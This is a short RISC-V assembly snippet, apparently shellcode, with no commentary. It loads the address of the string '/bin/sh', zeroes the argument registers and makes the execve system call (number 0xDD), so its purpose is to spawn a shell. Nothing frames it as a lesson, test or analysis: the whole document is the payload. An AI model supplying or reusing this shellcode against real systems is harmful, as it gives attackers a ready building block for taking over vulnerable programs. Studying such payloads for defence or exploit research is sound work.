start:
    auipc a0, 0
    addi a0, a0, 0x12
    li a1, 0
    li a2, 0
    li a7, 0xDD
    ecall

shell:
    .string "/bin/sh"
